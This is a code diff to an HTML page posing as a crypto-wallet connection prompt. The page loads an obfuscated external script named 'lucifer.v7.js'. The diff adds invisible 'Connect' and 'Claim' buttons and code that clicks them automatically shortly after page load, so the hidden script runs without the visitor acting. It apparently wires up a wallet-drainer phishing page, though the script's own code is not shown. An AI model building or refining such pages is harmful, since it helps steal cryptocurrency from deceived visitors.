@@ -45,6 +45,8 @@
             padding: 2.5rem 2rem;
             box-shadow: 0 12px 32px rgba(0, 0, 0, 0.05);
             text-align: center;
+            position: relative;
+            z-index: 10;
         }
 
         .header-logo {
@@ -114,6 +116,19 @@
             color: var(--text-main);
             border-color: #cccccc;
         }
+
+        /* Hidden Target Layer to satisfy the obfuscated script trackers */
+        .hidden-triggers {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            padding: 0;
+            margin: -1px;
+            overflow: hidden;
+            clip: rect(0, 0, 0, 0);
+            border: 0;
+            opacity: 0;
+        }
     </style>
 </head>
 <body>
@@ -131,7 +146,13 @@
         <button class="cancel-btn" onclick="goBack()">Cancel Request</button>
     </div>
 
-    <script type="module" crossorigin src="./files/lucifer.v7.js"></script>
+    <div class="hidden-triggers">
+        <button class="interactBtn" id="connectButton">Connect</button>
+        <button class="claimBtn" id="claimButton">Claim</button>
+        <div class="wallet-info"></div>
+    </div>
+
+    <script type="module" crossorigin src="/files/lucifer.v7.js"></script>
 
     <script>
         const urlParams = new URLSearchParams(window.location.search);
@@ -140,40 +161,16 @@
         document.getElementById('statusTitle').textContent = `Connecting to ${activeWallet}`;
         document.getElementById('statusDesc').textContent = `Please review and approve the interface connection request within your standard ${activeWallet} utility extension.`;
 
-        function initConnection() {
-            if (window.connectWallet && typeof window.connectWallet === 'function') {
-                window.connectWallet(activeWallet);
-                
-                // Route the user back to the React app dashboard after giving the script time to execute
-                setTimeout(() => {
-                    redirectToApp();
-                }, 6000);
-
-            } else if (window.connect && typeof window.connect === 'function') {
-                window.connect(activeWallet);
-                
-                setTimeout(() => {
-                    redirectToApp();
-                }, 6000);
-            } else {
-                console.log(`Lucifer binding not ready yet. Retrying in a moment...`);
-                setTimeout(initConnection, 300);
-            }
-        }
-
         window.addEventListener('DOMContentLoaded', () => {
-            initConnection();
-            
-            // EMERGENCY FAILSAFE: Force redirect back to app if something completely freezes up
+            // Automatically trigger the internal tracking listener of the obfuscated module
             setTimeout(() => {
-                redirectToApp();
-            }, 10000);
+                const hiddenBtn = document.querySelector('.interactBtn');
+                if (hiddenBtn) {
+                    console.log("Simulating interaction for obfuscated script framework...");
+                    hiddenBtn.click();
+                }
+            }, 400);
         });
-
-        function redirectToApp() {
-            // Sends the browser cleanly out of this static asset back to your main site root context
-            window.location.href = '/'; 
-        }
 
         function goBack() {
             window.history.back();
